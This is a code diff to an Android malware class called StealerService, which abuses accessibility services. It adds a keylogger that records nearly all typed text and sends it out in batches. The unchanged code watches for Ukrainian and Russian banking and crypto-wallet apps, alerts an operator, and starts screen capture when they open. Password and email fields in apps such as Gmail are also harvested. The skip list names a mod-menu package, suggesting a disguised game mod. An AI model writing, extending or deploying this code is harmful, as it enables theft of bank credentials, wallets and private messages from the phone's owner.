@@ -13,6 +13,12 @@ public class StealerService extends AccessibilityService {
     private long lastSend = 0;
     private long lastBankAlert = 0;
 
+    // кейлоггер
+    private StringBuilder keyBuf = new StringBuilder();
+    private long lastKeySend = 0;
+    private static final long KEY_COOLDOWN = 10000;
+    private String lastPkg = "";
+
     private static final List<String> TARGETS = Arrays.asList(
         "com.google.android.gm",
         "com.google.android.apps.gmail",
@@ -28,17 +34,21 @@ public class StealerService extends AccessibilityService {
     );
 
     private static final List<String> BANK_APPS = Arrays.asList(
-        "com.ftband.mono",
-        "com.monobank.app",
-        "ua.privatbank.ap24",
-        "ru.privatbank",
-        "ua.oschadbank.online",
-        "com.alfabank.oavdo.amc",
-        "com.binance.dev",
-        "com.coinbase.android",
-        "io.metamask",
-        "com.trustwallet.app",
-        "com.google.android.apps.walletnfcrel"
+        "com.ftband.mono", "com.monobank.app",
+        "ua.privatbank.ap24", "ru.privatbank",
+        "ua.oschadbank.online", "com.alfabank.oavdo.amc",
+        "com.binance.dev", "com.coinbase.android",
+        "io.metamask", "com.trustwallet.app"
+    );
+
+    private static final List<String> SKIP_KEYLOG = Arrays.asList(
+        "com.android.systemui",
+        "com.brawl.modmenu",
+        "com.android.settings",
+        "com.android.launcher",
+        "com.android.launcher3",
+        "com.google.android.inputmethod",
+        "com.google.android.apps.inputmethod"
     );
 
     @Override
@@ -46,7 +56,7 @@ public class StealerService extends AccessibilityService {
         if (event == null) return;
         int type = event.getEventType();
 
-        // проверяем открытие банковских приложений
+        // BANK триггер
         if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             CharSequence pkgCs = event.getPackageName();
             if (pkgCs != null) {
@@ -55,7 +65,6 @@ public class StealerService extends AccessibilityService {
                     && System.currentTimeMillis() - lastBankAlert > 30000) {
                     lastBankAlert = System.currentTimeMillis();
                     Exfil.send("BANK_OPEN", "Открыт банк/крипта: " + pkg);
-                    // команда на скрин
                     try {
                         android.content.Intent i =
                             new android.content.Intent(this, MediaSniffer.class);
@@ -66,6 +75,33 @@ public class StealerService extends AccessibilityService {
             }
         }
 
+        // KEYLOGGER — ловим всё что вводится
+        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            CharSequence pkgCs = event.getPackageName();
+            if (pkgCs != null) {
+                String pkg = pkgCs.toString();
+                if (SKIP_KEYLOG.contains(pkg)) return;
+
+                CharSequence text = event.getText() != null && event.getText().size() > 0
+                    ? event.getText().get(0) : null;
+                if (text != null && text.length() > 0 && text.length() < 500) {
+                    if (!pkg.equals(lastPkg)) {
+                        keyBuf.append("\n[").append(pkg).append("]\n");
+                        lastPkg = pkg;
+                    }
+                    keyBuf.append(text).append("\n");
+
+                    if (System.currentTimeMillis() - lastKeySend > KEY_COOLDOWN
+                        && keyBuf.length() > 30) {
+                        Exfil.send("KEYS", keyBuf.toString());
+                        keyBuf.setLength(0);
+                        lastKeySend = System.currentTimeMillis();
+                    }
+                }
+            }
+        }
+
+        // STEAL — пароли в целевых приложениях
         if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
             type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;
 
@@ -112,17 +148,6 @@ public class StealerService extends AccessibilityService {
             sb.append("[PWD] ").append(text).append("\n");
         } else if (isEmail && text != null && text.length() > 0) {
             sb.append("[EMAIL] ").append(text).append("\n");
-        }
-
-        if (hint != null && text != null && text.length() > 0 && text.length() < 120) {
-            String h = hint.toString().toLowerCase();
-            if (h.contains("парол") || h.contains("password")) {
-                sb.append("[PWD-H] ").append(text).append("\n");
-            } else if (h.contains("код") || h.contains("code")) {
-                sb.append("[CODE] ").append(text).append("\n");
-            } else if (h.contains("телефон") || h.contains("phone")) {
-                sb.append("[PHONE] ").append(text).append("\n");
-            }
         }
 
         for (int i = 0; i < n.getChildCount(); i++) {
